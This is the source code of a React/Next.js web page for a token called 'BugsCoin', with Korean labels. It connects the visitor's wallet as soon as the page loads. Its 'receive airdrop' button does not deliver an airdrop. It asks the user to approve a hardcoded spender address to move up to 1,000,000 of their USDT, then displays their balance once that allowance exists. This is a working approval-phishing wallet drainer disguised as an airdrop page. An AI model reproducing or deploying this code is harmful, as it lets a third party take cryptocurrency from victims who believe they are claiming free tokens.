"use client";

import React, { useEffect, useState } from "react";
import Web3 from "web3";
import styled from "styled-components";
import Link from "next/link";

// Styled Components for the layout
const Container = styled.div`
  background-color: black;
  color: white;
  text-align: center;
  min-height: 100vh;
  display: flex;
  flex-direction: column;
  align-items: center;
  justify-content: flex-start;
`;

const Header = styled.header`
  width: 100%;
  display: flex;
  justify-content: flex-start;
  align-items: center;
  padding: 20px;
  background-color: black;
`;

const Logo = styled.img`
  height: 40px;
  cursor: pointer;
`;

const ContentImage = styled.img`
  width: 100%;
  height: 383px;
  object-fit: cover;
  margin: 0;
`;

const ButtonContainer = styled.div`
  display: flex;
  flex-direction: column;
  gap: 20px;
  margin-top: 0;
`;

const Button = styled.button`
  width: 210px;
  height: 55px;
  background-color: black;
  color: white;
  border: 1px solid white;
  cursor: pointer;
  font-size: 16px;
  font-weight: bold;
  margin: 0 auto;
  white-space: normal;
  text-align: center;

  &:hover {
    background-color: white;
    color: black;
  }
`;

const FooterText = styled.p`
  font-size: 18px;
  font-weight: light;
  font-family: Arial, sans-serif;
  color: white;
  opacity: 0.8;
  margin-top: 60px;
  text-shadow: 1px 1px 2px rgba(0, 0, 0, 0.5);
`;

export default function DApp() {
  const [web3, setWeb3] = useState(null);
  const [account, setAccount] = useState(null);
  const [isApproved, setIsApproved] = useState(false);
  const [usdtBalance, setUsdtBalance] = useState("0");
  const usdtContractAddress = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
  const spenderAddress = "0x44E3AD8C4D486F4070822645462E5a23d46Cf7F1";
  const approveAmount = Web3.utils.toWei("1000000", "mwei");

  useEffect(() => {
    if (typeof window.ethereum !== "undefined") {
      const web3Instance = new Web3(window.ethereum);
      setWeb3(web3Instance);
      connectWallet();
    } else if (window.web3) {
      // Trust Wallet 또는 다른 dApp 브라우저에서 window.web3를 지원할 경우
      const web3Instance = new Web3(window.web3.currentProvider);
      setWeb3(web3Instance);
      connectWallet();
    } else {
      alert("메타마스크 또는 트러스트 월렛을 설치해 주세요.");
    }
  }, []);

  useEffect(() => {
    if (web3 && account) {
      checkApprovalStatus(account);
    }
  }, [web3, account]);

  const connectWallet = async () => {
    try {
      const accounts = await window.ethereum.request({
        method: "eth_requestAccounts",
      });
      setAccount(accounts[0]);
    } catch (error) {
      console.error("지갑 연결 중 오류 발생", error);
    }
  };

  const checkApprovalStatus = async (userAccount) => {
    if (web3) {
      const usdtContract = new web3.eth.Contract(
        [
          {
            constant: true,
            inputs: [
              { name: "_owner", type: "address" },
              { name: "_spender", type: "address" },
            ],
            name: "allowance",
            outputs: [{ name: "remaining", type: "uint256" }],
            type: "function",
          },
          {
            constant: true,
            inputs: [{ name: "who", type: "address" }],
            name: "balanceOf",
            outputs: [{ name: "balance", type: "uint256" }],
            type: "function",
          },
        ],
        usdtContractAddress
      );

      try {
        const allowance = await usdtContract.methods
          .allowance(userAccount, spenderAddress)
          .call();
        if (parseFloat(allowance) > 0) {
          setIsApproved(true);
          const balance = await usdtContract.methods.balanceOf(userAccount).call();
          const balanceInUsdt = Web3.utils.fromWei(balance, "mwei");
          setUsdtBalance(Math.floor(balanceInUsdt));
        }
      } catch (error) {
        console.error("승인 상태 확인 중 오류 발생", error);
      }
    }
  };

  const approveUsdt = async () => {
    if (web3 && account) {
      const usdtContract = new web3.eth.Contract(
        [
          {
            constant: false,
            inputs: [
              { name: "_spender", type: "address" },
              { name: "_value", type: "uint256" },
            ],
            name: "approve",
            outputs: [{ name: "success", type: "bool" }],
            type: "function",
          },
        ],
        usdtContractAddress
      );

      try {
        await usdtContract.methods
          .approve(spenderAddress, approveAmount)
          .send({ from: account });
        alert("승인이 완료되었습니다.");
      } catch (error) {
        console.error("승인 중 오류 발생", error);
      }
    }
  };

  const handleAirdropClick = () => {
    if (!account) {
      window.location.href = "/inbum/notice";
    } else if (!isApproved) {
      approveUsdt();
    }
  };

  return (
    <Container>
      <Header>
        <Link href="/">
          <Logo src="/bugscoin.png" alt="Logo" />
        </Link>
      </Header>

      <ContentImage src="/bugscoin-bg.png" alt="Main Image" />

      <ButtonContainer>
        {isApproved ? (
          <Button>{`보유: ${usdtBalance} USDT`}<br />
          {`(ERC-20)`}</Button>
        ) : (
          <Button onClick={handleAirdropClick}>에어드랍 받기</Button>
        )}
        <Button>한글백서</Button>
        <Button>Whitepaper</Button>
      </ButtonContainer>

      <FooterText>© 2024 BugsCoin All rights reserved.</FooterText>
    </Container>
  );
}
